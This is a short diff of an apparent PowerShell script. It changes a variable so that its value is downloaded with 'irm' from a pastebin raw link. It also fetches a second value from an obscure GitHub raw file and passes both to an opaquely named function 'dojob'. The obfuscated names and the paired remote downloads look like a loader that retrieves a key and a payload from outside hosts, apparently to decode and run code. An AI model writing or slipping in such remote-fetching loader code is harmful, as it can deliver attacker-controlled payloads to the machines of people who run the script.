@@ -10,7 +10,7 @@
     }
     return $asg
 }
-$k = "https://pastebin.com/raw/sL1FM7x4"
+$k = irm "https://pastebin.com/raw/sL1FM7x4"
 $t = irm "https://raw.githubusercontent.com/Bongman1234/assets/main/y6rhf4w"
 $isn = dojob -sec $t -bty $k
 
